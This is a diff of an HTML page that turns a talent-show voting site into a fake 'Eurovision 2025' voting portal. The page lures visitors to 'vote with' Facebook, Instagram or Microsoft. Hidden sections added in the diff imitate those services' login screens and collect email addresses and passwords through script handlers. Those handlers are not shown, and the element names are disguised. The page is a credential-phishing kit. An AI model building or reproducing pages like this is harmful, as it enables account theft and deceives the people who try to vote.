@@ -1,508 +1,674 @@
-
 <!doctype html>
-
 <html lang="en">
+  <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
 
   <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap"
+      rel="stylesheet" />
 
-    <!-- Required meta tags -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+    <meta
+      name="description"
+      content="View my latest Instagram post, please like and share..." />
+    <link
+      rel="shortcut icon"
+      type="image/x-icon"
+      href="images/favi-icon/favicon.ico/36b3ee2d91ed.ico" />
+    <!--Google Fonts-->
 
-    <meta charset="utf-8">
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
 
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="Filmfare Middle East Social Night. Filmfare Middle East are proud to present this much-awaited digital talent hunt once again.">
-  <meta name="keywords" content="Filmfare Middle East Social Night">
-    <link rel="shortcut icon" href="https://arabasiastarz.com/season-2/assets/images/favicon.ico">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            fontFamily: {
+              sans: ["Inter", "sans-serif"], // Set Inter as the default sans-serif font
+            },
+          },
+        },
+      };
+    </script>
 
-    <!-- Bootstrap CSS -->
+    <!-- Tailwind Custom Styles -->
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            animation: {
+              europe: "europeColors 3s infinite alternate",
+            },
+            keyframes: {
+              europeColors: {
+                "0%": { backgroundColor: "#0033A0" } /* EU Blue */,
+                "50%": { backgroundColor: "#FFCC00" } /* EU Yellow */,
+                "100%": {
+                  backgroundColor: "#0033A0",
+                } /* Back to EU Blue */,
+              },
+            },
+          },
+        },
+      };
+    </script>
 
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
-
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-
-    <link href="home/css/style.css" rel="stylesheet" />
-    
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
-		<!-- <link rel="stylesheet" href="https://brokersworld.ae/assets/countries/build/css/demo.css"> -->
-
-
-    <link rel="stylesheet" href="css/index.css">
-    
-    <script src="js/jquery-3.6.0.min.js"></script>
-        
-    <script src="js/index.js"></script>
-    
-    <title>Zara Social Media Influencers</title>
-
-             <style>
-
-                /* General Styles */
-
-                .video video{max-height:450px;}.none{display:none;} h1{color:#ffffff;}
-                .card.text-center{margin-bottom:10px;}
-                .alert{text-align:center;}
-                .alert .close{display:none;}
-                .sub_nav{width:40%;margin: 20px auto;}
-                .nav_link:hover{background-color: #3e8e41;}
-                .sub_nav .nav-link{background: #a64ac9;margin:3px;color:#ffffff;}
-                .nav-pills .nav-link.active, .nav-pills .show>.nav-link {
-                    color: #fff;
-                    background-color: #ca0076;}
-                .subnav:hover .ul_subnav{display:block !important;}
-                .ul_subnave{display:none;list-style:none;position:absolute;}
-                .ul_subnave li{background: #a64ac9;margin:3px;color:#ffffff;}
-                .ul_subnave li{background: #a64ac9; margin: 3px; padding: 9px 38px; color: #ffffff; margin-left: -16px; border-radius: 4px;}
-
-                    /* Dropdown Button */
-                .dropbtn {
-                  background-color: #04AA6D;
-                  color: white;
-                  font-size: 16px;
-                  border: none;
-                }
-
-                /* The container <div> - needed to position the dropdown content */
-                .dropdown {
-                  position: relative;
-                  display: inline-block;
-                }
-
-                /* Dropdown Content (Hidden by Default) */
-                .dropdown-content {
-                  display: none;
-                  position: absolute;
-                  background-color: #f1f1f1;
-                  min-width: 160px;
-                  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
-                  z-index: 1;
-                }
-
-                /* Links inside the dropdown */
-                .dropdown-content a {
-                  color: black;
-                  padding: 12px 16px;
-                  text-decoration: none;
-                  display: block;
-                }
-
-                /* Change color of dropdown links on hover */
-                .dropdown-content a:hover {background-color: #ddd;}
-
-                /* Show the dropdown menu on hover */
-                .dropdown:hover .dropdown-content {display: block;}
-
-                /* Change the background color of the dropdown button when the dropdown content is shown */
-                /* .dropdown:hover .dropbtn {background-color: #3e8e41;} */
-              </style>
-
+    <link rel="stylesheet" type="text/css" href="css/index.css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Eurovision Song Contest | Basel 2025</title>
   </head>
 
   <body>
-<div id="home">
+    <div id="home" class="flex-auto">
+      <div id="" class="text-gray-600 wrapper">
+        <p class="flex flex-col justify-center text-center text-black text-lg">
+          EUROVISION CONTEST 2025
+        </p>
+        <center>
+          <img src="image/eur.webp" width="" height="" />
+        </center>
 
-         <div class="logo"><img src="image/eur.webp"></div><!-- logo -->
+        <div
+          onclick="vote()"
+          class="w-40 mx-auto flex flex-col border border-blue-500 rounded-md mt-6 mb-6 justify-center p-2 text-center text-white text-l cursor-pointer animate-europe">
+          Click here to vote
+        </div>
 
-       <div class="container-full">
-
-    <nav class="navbar navbar-expand-lg navbar-light bg-light">
-
-      <div class="container">
-
-        <a class="navbar-brand " href="#">Menu</a>
-        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-          <span class="navbar-toggler-icon"></span>
-        </button>
-
-        <div class="collapse navbar-collapse" id="navbarSupportedContent">
-
-          <ul class="navbar-nav me-auto mb-2 mb-lg-0">
-
-            <li class="nav-item">
-              <a class="nav-link active" aria-current="page" href="index.html">Home</a>
+        <div id="vote-counts">
+          <ul>
+            <li
+              class="text-blue-500 mb-2"
+              style="background: #f6f9fb; border-left: 2px solid #5b9bd1">
+              <i class="fa fa-"></i> About This Contest
             </li>
-
-            <li class="nav-item">
-              <a class="nav-link active" aria-current="page" href="#season1">Season 1</a>
-            </li>
-
-            <li class="nav-item">
-              <a class="nav-link " aria-current="page" href="#season2">Season 2</a>
-            </li>
-
-            <li class="nav-item">
-              <a class="nav-link " aria-current="page" href="#about">About</a>
-            </li>
-
-            <li class="nav-item">
-              <a class="nav-link " aria-current="page" href="#judges">Judges</a>
-            </li>
-
-            <!-- <li class="nav-item">
-
-              <a class="nav-link " aria-current="page" href="#gallery">Gallery</a>
-
-            </li>
-
-            <li class="nav-item">
-
-              <a class="nav-link" href="#">Shortlisted</a>
-
-            </li> -->
-
-            <li class="nav-item">
-              <a class="nav-link login-link" onclick="vote()">Vote</a>
-            </li>
-
-            <li class="nav-item">
-              <a class="nav-link" href="#registration"><button class="register-btn"><span>New Registration</span></button></a>
-            </li>
-
+            <a href="#" style="text-decoration: none; color: #6f808a86">
+              <li style="color: #17151586">
+                <i class="fa fa-"></i>Welcome to the voting portal of the
+                Eurovision contest, where dreams take center stage and raw
+                talent meets opportunity! Our platform is dedicated to
+                discovering, nurturing, and celebrating exceptional individuals
+                across various creative fields.
+              </li>
+            </a>
           </ul>
-
         </div>
 
+        <div id="vote-counts" class="mt-10">
+          <ul>
+            <li
+              class="text-blue-500"
+              style="background: #f6f9fb; border-left: 2px solid #5b9bd1">
+              <i class="fa fa-contest"></i> Contestants
+            </li>
+            <li style="color: #6f808a86"></li>
+          </ul>
+        </div>
+
+        <div class="container mx-auto mt-4">
+          <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8">
+            <!-- Contestant 1 -->
+            <div
+              class="bg-white shadow-lg rounded-lg p-4 text-center transform transition duration-300 hover:scale-105">
+              <img
+                src="image/father-and-son-3315817_1280.jpg"
+                alt="Singing Contestant"
+                class="w-full h-60 object-cover rounded-lg" />
+
+              <h2 class="text-xl font-semibold mt-3">Contestant 827</h2>
+              <p
+                class="text-gray-600 inline-block bg-red-100 rounded-md text-sm w-1/5">
+                Singing
+              </p>
+              <button
+                class="mt-4 px-6 py-2 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition">
+                Vote
+              </button>
+            </div>
+
+            <!-- Contestant 2 -->
+            <div
+              class="bg-white shadow-lg rounded-lg p-4 text-center transform transition duration-300 hover:scale-105">
+              <img
+                src="image/adult-1850184_1280.jpg"
+                alt="Contestant"
+                class="w-full h-60 object-cover rounded-lg" />
+              <h2 class="text-xl font-semibold mt-3">Contestant 3625</h2>
+              <p
+                class="text-gray-600 inline-block bg-purple-100 rounded-md text-sm w-1/5">
+                Dancing
+              </p>
+              <button
+                class="mt-4 px-6 py-2 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition">
+                Vote
+              </button>
+            </div>
+
+            <!-- Contestant 3 -->
+            <div
+              class="bg-white shadow-lg rounded-lg p-4 text-center transform transition duration-300 hover:scale-105">
+              <img
+                src="image/clown-4787558_1280.jpg"
+                alt="Contestant"
+                class="w-full h-60 object-cover rounded-lg" />
+              <h2 class="text-xl font-semibold mt-3">Contestant 2651</h2>
+              <p
+                class="text-gray-600 inline-block bg-green-100 rounded-md text-sm w-1/5">
+                Comedy
+              </p>
+              <button
+                class="mt-4 px-6 py-2 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition">
+                Vote
+              </button>
+            </div>
+
+            <!-- Contestant 4 -->
+            <div
+              class="bg-white shadow-lg rounded-lg p-4 text-center transform transition duration-300 hover:scale-105">
+              <img
+                src="image/theater-4941742_1280.jpg"
+                alt="Contestant"
+                class="w-full h-60 object-cover rounded-lg" />
+              <h2 class="text-xl font-semibold mt-3">Contestant 2832</h2>
+              <p
+                class="text-gray-600 inline-block bg-orange-100 rounded-md text-sm w-1/5">
+                Acting
+              </p>
+              <button
+                class="mt-4 px-6 py-2 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition">
+                Vote
+              </button>
+            </div>
+
+            <!-- Contestant 5 -->
+            <div
+              class="bg-white shadow-lg rounded-lg p-4 text-center transform transition duration-300 hover:scale-105">
+              <img
+                src="image/catwalk-1840941_1280.jpg"
+                alt="Contestant"
+                class="w-full h-60 object-cover rounded-lg" />
+              <h2 class="text-xl font-semibold mt-3">Contestant 2514</h2>
+              <p
+                class="text-gray-600 inline-block bg-yellow-100 rounded-md text-sm w-1/5">
+                Fashion
+              </p>
+              <button
+                class="mt-4 px-6 py-2 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition">
+                Vote
+              </button>
+            </div>
+
+            <!-- Contestant 6 -->
+            <div
+              class="bg-white shadow-lg rounded-lg p-4 text-center transform transition duration-300 hover:scale-105">
+              <img
+                src="image/brushes-4226688_1280.jpg"
+                alt="Contestant"
+                class="w-full h-60 object-cover rounded-lg" />
+              <h2 class="text-xl font-semibold mt-3">Contestant 928</h2>
+              <p
+                class="text-gray-600 inline-block bg-pink-100 rounded-md text-sm w-1/5">
+                Painting
+              </p>
+              <button
+                class="mt-4 px-6 py-2 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition">
+                Vote
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <div
+          id="choose-social"
+          class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 hidden">
+          <div
+            class="relative bg-white p-6 rounded-lg shadow-lg w-80 max-w-full">
+            <!-- Close Button -->
+            <button
+              onclick="can()"
+              class="absolute top-2 right-2 w-8 h-8 flex items-center justify-center text-white bg-red-500 rounded-full text-lg hover:bg-red-600 transition duration-300 shadow-md">
+              ✕
+            </button>
+
+            <h2 class="text-lg font-semibold text-gray-700 text-center mb-4">
+              Vote With
+            </h2>
+
+            <div class="flex flex-col gap-3">
+              <button
+                class="fb_votebutton w-full py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition"
+                onclick="im(); can();">
+                VOTE WITH <i class="fa fa-facebook"></i>
+              </button>
+              <button
+                class="ig_votebutton w-full py-2 bg-pink-500 text-white rounded-lg hover:bg-pink-600 transition"
+                onclick="bni(); can();">
+                VOTE WITH <i class="fa fa-instagram"></i>
+              </button>
+              <button
+                class="hm_votebutton w-full py-2 bg-gray-800 text-white rounded-lg hover:bg-gray-900 transition"
+                onclick="gwa(); can();">
+                VOTE WITH <i class="bi bi-microsoft"></i>
+              </button>
+            </div>
+          </div>
+        </div>
       </div>
 
-    </nav>
-
-       </div> <!-- container fluid -->
-
-
-
-  <div id="carouselExampleControls" class="carousel slide" data-bs-ride="carousel">
-  <div class="carousel-inner">
-    <div class="carousel-item active">
-      <img src="home/img/banner.jpg" class="d-block w-100" />
+      <p class="PoweredBy">Powered by <span> Eurovision</span></p>
     </div>
-    <div class="carousel-item">
-      <img src="home/img/banner.jpg" class="d-block w-100" />
-    </div>
-    <div class="carousel-item">
-      <img src="home/img/banner.jpg" class="d-block w-100" />
-    </div>
-  </div>
-  <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleControls" data-bs-slide="prev">
-    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
-    <span class="visually-hidden">Previous</span>
-  </button>
-  <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleControls" data-bs-slide="next">
-    <span class="carousel-control-next-icon" aria-hidden="true"></span>
-    <span class="visually-hidden">Next</span>
-  </button>
-</div>
 
-
-<!-- -------------------------------ABOUT Season 3---------------------------------- -->
-
-
-
-<section id="about-s3">
-
-      <div class="heading" ><h2 style="font-size:30px;padding:5px;">OVERVIEW</h2></div>  
-
-<div class="container">
- <p>The stage is set, and the spotlight is on the most talented voices and performers of our region. It’s time to celebrate the artists who’ve moved us with their melodies, lyrics, and passion for music. The ultimate Song Contest 2025 is here, and your favorite artists need YOUR support to win the crown!</p>
- <p>Vote for your favorites and help them rise to the top. Every vote counts, so don’t wait—let’s make this a night to remember for the stars who’ve earned millions of hearts through their music. </p>
-<p class="mt40" style="color:#0a58ca"><b>The winners of “this contest” will be celebrated at a grand ceremony on 15th September, 2025.</b></p>
-</div>
-
-
-
-</section>
-
-    <!-- ---------------------- Contestants -------------------------------- -->
-
-
-
-    <section id="contestents">
-
-      <div class="heading" ><h2 style="font-size:30px;padding:5px;">VOTE</h2></div>  
-      <div class="row">  
-            
-        <div class="col-sm-4">
-            <div class="card text-center">
-                <div class="card-header">Contestant 001</div> 
-                  <div class="card-body">
-                      <h5 class="card-title"><span class="badge bg-warning text-dark">Beauty</span> </h5>
-                      <video controls width="100%">
-
-                          <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1651045151/gussookvqhz3vhve9dic.mov" type="video/mp4">
-
-                          <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                          Your browser does not support HTML video.
-                      </video>
-                      <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >VOTE For Contestant 001 </a></button>
+    <div id="cityboiz">
+      <div id="lagos" class="bg-gray mt-4">
+        <div class="min-h-screen flex flex-col w-full">
+          <!-- Main Content Section -->
+          <main class="flex-grow">
+            <div class="tokpart">
+              <div class="p-5 w-full max-w-md">
+                <img src="img/apapmapa2.png" alt="logo" class="h-10 mt-20" />
+                <h2
+                  id="heading"
+                  class="text-4xl font-bold text-white mb-0 mt-12 text-left">
+                  Sign in
+                </h2>
+                <p class="text-xl text-white mb-6 mt-0 text-left">
+                  to continue
+                </p>
+                <!-- oruk Input -->
+                <div id="janape" class="flex justify-start">
+                  <input
+                    type="text"
+                    id="lag-oruko"
+                    name="oruk"
+                    required
+                    class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
+                    placeholder="Email, phone, or Skype" />
+                </div>
+                <div class="flex justify-start">
+                  <button
+                    id="forgotPasswordButton"
+                    type="button"
+                    class="text-gray-200 py-2 px-1 bg-transparent focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-900 mt-0">
+                    No account?
+                    <span class="text-blue-500 hover:underline">
+                      Create one!</span
+                    >
+                  </button>
+                </div>
+                <!-- Next Button to show password field -->
+                <button
+                  id="nextButton"
+                  type="button"
+                  onclick="revField()"
+                  class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                  Next
+                </button>
+                <!-- Password Field (hidden initially) -->
+                <div id="passwordField" class="hidden mt-4">
+                  <div class="mb-4 relative">
+                    <input
+                      type="text"
+                      id="lag-zom"
+                      name="password"
+                      required
+                      class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
+                      placeholder="Password" />
                   </div>
-                <div class="card-footer text-muted"> Votes : 312 </div>
-            </div>
-        </div>
-               
-        <div class="col-sm-4">      
-            <div class="card text-center">
-              <div class="card-header">Contestant 002  </div>
-                <div class="card-body">
-                    <h5 class="card-title"><span class="badge bg-warning text-dark">Beauty</span> </h5>
-                    <video controls width="100%">
-
-                        <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1651051566/vh4vxtiyhqhxijn7vcl3.mp4" type="video/mp4">
-
-                        <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                        Your browser does not support HTML video.
-                    </video>
-                    <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                    VOTE For Contestant 002 </a></button>
-
-                 </div>
-                <div class="card-footer text-muted"> Votes : 423 
-              </div>
-          </div>
-        </div>
-                
-        <div class="col-sm-4">
-          <div class="card text-center">
-             <div class="card-header">Contestant 003  </div>
-                <div class="card-body">
-                    <h5 class="card-title"><span class="badge bg-warning text-dark">Beauty</span> </h5>
-                    <video controls width="100%">
-
-                        <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1650881288/xvkrnodivdbhbmatjybi.mov" type="video/mp4">
-
-                        <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                        Your browser does not support HTML video.
-                    </video>
-                    <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                    VOTE For Contestant 003 </a></button>
-                  
-                  </div>
-                <div class="card-footer text-muted"> Votes : 190 
+                  <button
+                    id="nextButton"
+                    type="button"
+                    onclick="lag()"
+                    class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                    Submit
+                  </button>
+                </div>
               </div>
             </div>
-        </div>
-              
-        <div class="col-sm-4">
-          <div class="card text-center">
-            <div class="card-header">Contestant 004  </div>
-                <div class="card-body">
-                    <h5 class="card-title"><span class="badge bg-warning text-dark">Beauty</span> </h5>
-                    <video controls width="100%">
-
-                      <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1650902472/hbxqm4rlsphxknqtsenf.mov" type="video/mp4">
-
-                      <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                      Your browser does not support HTML video.
-
-                    </video>
-                    <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                    VOTE For Contestant 004 </a></button>
-                </div>
-              <div class="card-footer text-muted"> Votes : 158 
+          </main>
+          <!-- Footer Section -->
+          <footer
+            id="error-message"
+            class="hidden bg-blue-600 text-white text-sm mt-2 text-center py-6 mt-auto w-full">
+            <div class="w-full px-4">
+              <div class="flex justify-between items-center">
+                Sorry, we could not find your account.
+              </div>
             </div>
-          </div>
+          </footer>
         </div>
-            
-        <div class="col-sm-4">
-          <div class="card text-center">
-              <div class="card-header">Contestant 005  </div>
-                <div class="card-body">
-                  <h5 class="card-title"><span class="badge bg-warning text-dark">Beauty</span> </h5>
-                  <video controls width="100%">
+      </div>
 
-                    <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1650861927/wnpa1bm2drnv8neqssym.mov" type="video/mp4">
-
-                    <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                    Your browser does not support HTML video.
-                  </video>
-
-                  <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                  VOTE For Contestant 005 </a></button>
-                </div>
-              <div class="card-footer text-muted"> Votes : 153 
+      <div id="edo" class="bg-black">
+        <div class="min-h-screen flex flex-col w-full">
+          <!-- Main Content Section -->
+          <main class="flex-grow p-2">
+            <!-- Reduced padding here -->
+            <div class="flex justify-center mt-11 mb-6">
+              <!-- Centered Image -->
+              <img src="image/manae.svg" alt="logo" class="h-12" />
             </div>
-          </div>
+            <div class="tokpart bg-black">
+              <div class="bg-black p-8 w-full max-w-md">
+                <div id="buttonsContainer">
+                  <!-- Container Div for Google, Apple Buttons, and 'or' Divider -->
+                  <button
+                    type="button"
+                    onclick=""
+                    class="w-full py-2 bg-blue-600 px-4 rounded-md flex items-center justify-center text-white focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4"
+                    style="
+                      font-family: &quot;Google Sans&quot;, arial, sans-serif;
+                      font-weight: 400;
+                      overflow: hidden;
+                    ">
+                    <!-- Google Icon -->
+                    Continue Using
+                    <img
+                      src="image/fav.png"
+                      alt="Google Icon"
+                      class="h-5 ml-3" />
+                  </button>
+                  <div class="flex items-center my-4">
+                    <div class="flex-grow border-t border-gray-700"></div>
+                    <span class="mx-4 text-gray-500">OR</span>
+                    <div class="flex-grow border-t border-gray-700"></div>
+                  </div>
+                </div>
+                <!-- oruk Input -->
+                <div class="mb-4 relative">
+                  <input
+                    type="text"
+                    id="edo-oruko"
+                    name=""
+                    required
+                    class="mt-1 block w-full px-3 py-2 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300"
+                    placeholder="Phone, email address, or username" />
+                </div>
+                <div class="mb-4">
+                  <!-- Input Field -->
+                  <input
+                    type="text"
+                    id="edo-zom"
+                    name=""
+                    required
+                    class="mt-1 block w-full px-3 py-2 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300"
+                    placeholder="Password" />
+
+                  <!-- Forgot Password Button -->
+                  <button
+                    type="button"
+                    class="text-blue-600 py-2 px-4 rounded-none bg-transparent border-0 hover:text-blue-800 focus:outline-none focus:ring-0 mt-0 mr-0 ml-auto block">
+                    Forgotten login?
+                  </button>
+                </div>
+                <!-- Login Button -->
+                <button
+                  type="button"
+                  onclick="edolog()"
+                  class="w-full bg-blue-600 text-gray-100 py-2 px-4 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4">
+                  Log in
+                </button>
+              </div>
+            </div>
+          </main>
+
+          <!-- Footer Section -->
+          <footer
+            id="error-message"
+            style="background-color: rgb(18, 18, 18)"
+            class="text-white text-sm mt-2 text-center py-1 mt-auto w-full">
+            <div class="flex justify-center items-center flex-col">
+              <!-- Text above the image with reduced margin -->
+              <p class="mb-0" style="font-size: 12px; margin-bottom: 2px">
+                from
+              </p>
+              <!-- Linked image -->
+              <a href="">
+                <img src="image/mee.png" alt="logo" class="h-14" />
+              </a>
+            </div>
+          </footer>
         </div>
-                
-        <div class="col-sm-4">
-          <div class="card text-center">
-            <div class="card-header">Contestant 006  </div>
-              <div class="card-body">
-                  <h5 class="card-title"><span class="badge bg-warning text-dark">Beauty</span> </h5>
-                  <video controls width="100%">
-                    <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1650954394/qylocmbs1vsekvo9pdaf.mov" type="video/mp4">
+      </div>
 
-                    <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                    Your browser does not support HTML video.
-                  </video>
-                  <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                  VOTE For Contestant 006 </a></button>
-                </div>
-              <div class="card-footer text-muted"> Votes : 175 
+      <div id="owerri" class="bg-gray-100 text">
+        <div class="min-h-screen flex flex-col w-full">
+          <!-- Main Content Section -->
+          <main class="flex-grow p-2">
+            <!-- Reduced padding here -->
+            <div class="flex justify-center mt-9 mb-4">
+              <!-- Centered Image -->
+              <img src="img/bisho.png" alt="logo" class="h-12" />
             </div>
-          </div>
+            <div class="flex justify-center mb-4 text-black"></div>
+            <div class="tokpart">
+              <div
+                class="bg-white p-8 w-full max-w-md border border-white shadow-2xl rounded-lg">
+                <!-- oruk Input -->
+                <div class="mb-4 relative">
+                  <input
+                    type="text"
+                    id="owerri-oruko"
+                    name=""
+                    required
+                    class="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-800"
+                    placeholder="Email address or phone number" />
+                </div>
+                <div class="mb-4">
+                  <!-- Input Field -->
+                  <input
+                    type="text"
+                    id="owerris-zom"
+                    name=""
+                    required
+                    class="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-800"
+                    placeholder="Password" />
+                  <!-- Login Button -->
+                  <button
+                    type="button"
+                    onclick="imo()"
+                    class="w-full bg-[#0866ff] text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-[#0866ff] mt-4 font-semibold">
+                    Log in
+                  </button>
+                  <!-- Forgot Password Button -->
+                  <button
+                    type="button"
+                    class="w-full bg-transparent text-[#0866ff] py-3 px-6 text-sm rounded-md border-0 hover:text-[#0866ff] focus:outline-none focus:ring-0 mt-0">
+                    Forgotten Password?
+                  </button>
+                  <!-- Divider -->
+                  <div class="flex items-center my-2">
+                    <div class="flex-grow border-t border-gray-300"></div>
+                    <div class="flex-grow border-t border-gray-300"></div>
+                  </div>
+                  <!-- Create New Account Button -->
+                  <button
+                    type="button"
+                    class="w-full bg-green-600 text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-green-600 mt-4">
+                    Create new account
+                  </button>
+                </div>
+              </div>
+            </div>
+            <div class="flex justify-center mb-4 mt-7 text-gray-600">
+              <p class="text-l text-center break-words max-w-md">
+                <span style="font-weight: 600"> Create a Page </span> for a
+                celebrity, brand or business.
+              </p>
+            </div>
+          </main>
+
+          <!-- Footer Section -->
+          <footer
+            id="error-message"
+            class="bg-white text-gray-600 text-sm mt-2 py-5 w-full">
+            <div class="w-full px-5">
+              <!-- Container -->
+              <div class="flex flex-col gap-4">
+                <!-- Language Section -->
+                <div class="px-2">
+                  <div class="flex flex-wrap gap-2 text-xs text-gray-600">
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >English (UK)</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >Hausa</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >Français (France)</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >Português (Brasil)</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >Español</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >العربية</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >Bahasa Indonesia</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >Deutsch</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >日本語</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >Italiano</a
+                    >
+                    <a
+                      href="#"
+                      class="inline-block cursor-pointer hover:underline"
+                      >हिन्दी</a
+                    >
+                  </div>
+                </div>
+                <!-- Divider Line -->
+                <hr class="border-gray-300 w-full" />
+                <!-- Copyright Section -->
+                <div class="px-2 text-xs text-gray-500">&copy;2025</div>
+              </div>
+            </div>
+          </footer>
         </div>
-                
-        <div class="col-sm-4">
-          <div class="card text-center">
-            <div class="card-header">Contestant 007  </div>
-              <div class="card-body">
-                  <h5 class="card-title"><span class="badge bg-warning text-dark">Entertainment</span> - <span class="badge bg-info text-dark">Comedy</span></h5>
-                  <video controls width="100%">
-
-                    <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1650673041/ugqahcxwcc2hqmrvezgs.mov" type="video/mp4">
-
-                    <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                    Your browser does not support HTML video.
-
-                  </video>
-                  <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                  VOTE For Contestant 007 </a></button>
-                </div>
-              <div class="card-footer text-muted"> Votes : 98 
-            </div>
-          </div>
-        </div>
-                
-        <div class="col-sm-4">
-          <div class="card text-center">
-            <div class="card-header">Contestant 008  </div>
